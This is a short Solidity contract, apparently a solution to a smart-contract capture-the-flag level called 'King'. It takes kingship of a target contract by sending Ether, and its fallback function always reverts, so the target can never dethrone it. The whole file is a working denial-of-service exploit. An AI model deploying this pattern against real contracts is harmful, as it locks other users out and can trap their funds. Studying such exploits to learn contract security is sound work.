// SPDX-License-Identifier: MIT

import "./King.sol";

pragma solidity ^0.8.0;

contract KingAttack {
    King public king;

    constructor(address payable _kingAddress) {
        king = King(_kingAddress);
    }

    // Send enough Ether to become the king
    function becomeKing() external payable {
        (bool success, ) = address(king).call{value: msg.value}("");
        require(success, "Failed to become the king");
    }

    // Fallback function that always reverts
    fallback() external payable {
        revert("I am the king forever!");
    }
}
